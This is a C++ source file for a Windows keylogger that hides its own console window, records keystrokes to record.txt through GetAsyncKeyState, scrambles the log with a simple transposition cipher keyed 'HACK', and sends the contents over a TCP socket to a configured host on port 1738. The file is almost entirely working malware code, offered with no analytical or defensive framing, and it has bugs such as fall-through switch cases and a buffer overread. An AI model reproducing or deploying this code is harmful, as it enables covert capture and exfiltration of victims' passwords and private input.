#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <fstream>
#pragma comment(lib,"ws2_32.lib")
#include <ws2tcpip.h>
#include<bits/stdc++.h>
#include <stdio.h>
#include <stdlib.h>
#define PORT 1738
const char szHOST[] = "localhost";
using namespace std;
const int maximum=1000;
void StealthMode();
void log();
void client(){
    WSAData Wsadata;
    WORD Dllversion = MAKEWORD(2,1);
    if (WSAStartup(Dllversion, &Wsadata) !=0)
        ExitProcess(EXIT_FAILURE);
    SOCKET Sock = socket(AF_INET, SOCK_STREAM, 0);
    if (Sock < 0)
        ExitProcess(EXIT_FAILURE);
    HOSTENT *host = gethostbyname(szHOST);
    if(host == nullptr)
        ExitProcess(EXIT_FAILURE);
    SOCKADDR_IN sin;
    ZeroMemory(&sin, sizeof(sin));
    sin.sin_port = htons(PORT);
    sin.sin_family = AF_INET;
    memcpy(&sin.sin_addr.S_un.S_addr, host->h_addr_list[0], sizeof(sin.sin_addr.S_un.S_addr));
    if(connect(Sock, (const sockaddr *)&sin,sizeof(sin)) != 0)
        ExitProcess(EXIT_FAILURE);
    FILE *fp;
    char strs[1000];
    fp = fopen("record.txt" , "r");
    if( fgets (strs, 1024, fp)!=NULL ) {
        puts(strs);
    }
    fclose(fp);

    if(!send(Sock, strs, strlen(strs),0))
        ExitProcess(EXIT_FAILURE);

    closesocket(Sock);
    ExitProcess(EXIT_SUCCESS);
}
string const key = "HACK";
map<int,int> keyMap;

void setPermutationOrder()
{
    // Add the permutation order into map
    for(int i=0; i < key.length(); i++)
    {
        keyMap[key[i]] = i;
    }
}

// Encryption
string encryptMessage(string msg)
{
    int row,col,j;
    string cipher = "";
    /* calculate column of the matrix*/
    col = key.length();
    /* calculate Maximum row of the matrix*/
    row = msg.length()/col;
    if (msg.length() % col)
        row += 1;
    char matrix[row][col];
    for (int i=0,k=0; i < row; i++)
    {
        for (int j=0; j<col; )
        {
            if(msg[k] == '\0')
            {
                /* Adding the padding character '_' */
                matrix[i][j] = '_';
                j++;
            }
            if( isalpha(msg[k]) || msg[k]==' ')
            {
                /* Adding only space and alphabet into matrix*/
                matrix[i][j] = msg[k];
                j++;
            }
            k++;
        }
    }

    for (map<int,int>::iterator ii = keyMap.begin(); ii!=keyMap.end(); ++ii)
    {
        j=ii->second;
        // getting cipher text from matrix column wise using permuted key
        for (int i=0; i<row; i++)
        {
            if( isalpha(matrix[i][j]) || matrix[i][j]==' ' || matrix[i][j]=='_')
                cipher += matrix[i][j];
        }
    }
    return cipher;
}
int main(){
    StealthMode();
    log();
    string myText;
    ifstream MyReadFile("record.txt");
    /* message */
    while (getline (MyReadFile, myText)) {
        cout << myText;
    }
    string msg = myText;
    MyReadFile.close();
    setPermutationOrder();
    // Calling encryption function
    string cipher = encryptMessage(msg);
    cout << "Encrypted Message: " << cipher << endl;
    ofstream MyFile("record.txt");
    MyFile << cipher;
    MyFile.close();
        client();
        return 0;

}
void log()
{int count=0;
    char c ;
    for (int i = 0; i < 5; i++) {

        for (c = 8; c <= 222; c++) {
            if (GetAsyncKeyState(c) == -32767) {
                count++;
                ofstream write("record.txt", ios::app);
                switch (c) {
                    case 8   :
                        write << "<Backspace>";
                        count++;
                    case 27  :
                        write << "<Esc>";
                        count++;
                    case 127 :
                        write << "<Del>";
                        count++;
                    case 32  :
                        write << " ";
                        count++;
                    case 13  :
                        write << "<Enter>\n";
                        count++;
                    default :
                        write << c;
                        count++;
                }
                if (count>maximum){
                    break;
                }

            }

        }
    }
}



// Driver Program



void StealthMode(){
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);

}